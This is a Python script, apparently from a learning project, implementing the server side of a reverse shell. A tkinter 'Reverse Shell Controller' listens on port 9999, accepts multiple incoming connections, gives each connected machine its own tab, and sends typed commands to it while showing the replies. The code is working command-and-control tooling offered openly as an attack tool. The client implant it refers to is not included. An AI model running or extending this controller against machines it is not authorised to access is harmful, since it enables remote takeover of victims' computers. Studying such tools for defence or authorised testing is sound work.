#!/usr/bin/env python3

#Step 1: Createin a socket
#Step 2: Binding the socket and listening
#Step 3: Accepting a connection
#Step 4: Sending commands to the client
#Step 5: Client to server connection
#Step 6: Completing the client file




""" 
Reverse Shell with a GUI Interface
-----------------------------------------------------------------
This server listen for an incoming reverse connection and provides a simple GUI (using tkinter) to send commands and display outputs.ZeroDivisionError
"""

#import required Modules
import tkinter as tk
from tkinter import scrolledtext
from tkinter import ttk  # For creating tabs
import socket
import threading
import sys

# Configuration
Host = ''  # Empty string means all available interfaces (0.0.0.0)
Port = 9999  # Port to listen for incoming connections
Buffer_Size = 1024  # Buffer size for receiving data

MaxConnections = 5  # Maximum number of simultaneous connections

class ReverseShell:
    def __init__(self, master):
        self.master = master
        self.master.title("Reverse Shell Controller")  # Set window title

        # Create a frame for the initial message
        self.initial_frame = tk.Frame(self.master)
        self.initial_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Add a label to display the IP, PORT, and waiting message
        self.info_label = tk.Label(
            self.initial_frame,
            text=f"Server is running on IP: {Host or '0.0.0.0'}, PORT: {Port}\nWaiting for client connection...",
            font=("Arial", 12),
            justify=tk.CENTER
        )
        self.info_label.pack(pady=20)


        # Create a notebook (tabbed interface)
        self.notebook = ttk.Notebook(self.master)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        # Create server socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            # Bind the socket to the host and port
            self.server_socket.bind((Host, Port))
            self.server_socket.listen(MaxConnections)  # Listen for up to 5 incoming connections
            self.write_to_console(f"Listening on {Host}:{Port}...\n")

            # Accept incoming connections in a separate thread
            threading.Thread(target=self.accept_connections, daemon=True).start()
        except socket.error as e:
            self.write_to_console(f"[!] Socket error: {e}\n")
            sys.exit(1)

        self.clients = {}  # Dictionary to store client sockets and their tabs

    def write_to_console(self, message):
        """
        Print messages to the console (for debugging purposes).
        """
        print(message)

    def accept_connections(self):
        """
        Accept multiple incoming connections from clients.
        """
        while True:
            try:
                # Accept an incoming connection
                conn, addr = self.server_socket.accept()
                self.write_to_console(f"[+] Connection established from {addr}\n")

                # Switch to the notebook interface after the first connection
                if self.initial_frame.winfo_ismapped():
                    self.initial_frame.pack_forget()
                    self.notebook.pack(fill=tk.BOTH, expand=True)

                # Create a new tab for the client
                self.create_client_tab(conn, addr)
            except socket.error as e:
                self.write_to_console(f"[!] Error accepting connection: {e}\n")
                break

    def create_client_tab(self, conn, addr):
        """
        Create a new tab for a connected client.
        """
        # Create a new frame for the tab
        client_frame = tk.Frame(self.notebook)
        self.notebook.add(client_frame, text=f"{addr[0]}:{addr[1]}")  # Add tab with client address

        # Create a scrolled text area for displaying output
        output_area = scrolledtext.ScrolledText(client_frame, wrap=tk.WORD, state='disabled')
        output_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Create a text entry for the command input
        entry = tk.Entry(client_frame, width=80)
        entry.pack(padx=10, pady=(0, 10))

        # Create a send button to send commands
        send_button = tk.Button(client_frame, text="Send Command",
                                command=lambda: self.send_command(conn, entry, output_area))
        send_button.pack(pady=(0, 10))

        # Store client details
        self.clients[addr] = {
            "conn": conn,
            "output_area": output_area,
            "entry": entry
        }

        # Start a thread to handle communication with the client
        threading.Thread(target=self.handle_client, args=(conn, addr, output_area), daemon=True).start()

    def handle_client(self, conn, addr, output_area):
        """
        Handle communication with a single client.
        """
        while True:
            try:
                # Receive data from the client
                data = conn.recv(Buffer_Size)
                if not data:
                    self.write_to_console(f"[!] Connection closed by client {addr}\n")
                    break
                decoded = data.decode('utf-8', errors='ignore')
                self.write_to_output(output_area, f"[{addr}]: {decoded}\n")
            except socket.error as e:
                self.write_to_console(f"[!] Error receiving data from {addr}: {e}\n")
                break

        # Remove the client from the dictionary and close the connection
        del self.clients[addr]
        conn.close()

    def write_to_output(self, output_area, message):
        """
        Display message in the client's output area and auto-scroll it.
        """
        output_area.config(state='normal')  # Enable the text area
        output_area.insert(tk.END, message)  # Append message to the output area
        output_area.see(tk.END)  # Auto-scroll to the end
        output_area.config(state='disabled')  # Disable the text area again

    def send_command(self, conn, entry, output_area):
        """
        Send command from user input to the connected client.
        """
        cmd = entry.get().strip()  # Get text from entry field
        if cmd:
            try:
                # Send the command to the client
                conn.send(cmd.encode('utf-8'))
                self.write_to_output(output_area, f"[>]: {cmd}\n")
            except socket.error as e:
                self.write_to_output(output_area, f"[!] Error sending command: {e}\n")
            entry.delete(0, tk.END)  # Clear input field


# Main execution
if __name__ == "__main__":
    root = tk.Tk()  # Create the main window
    app = ReverseShell(root)  # Create an instance of the ReverseShell class
    root.mainloop()  # Start the GUI event loop
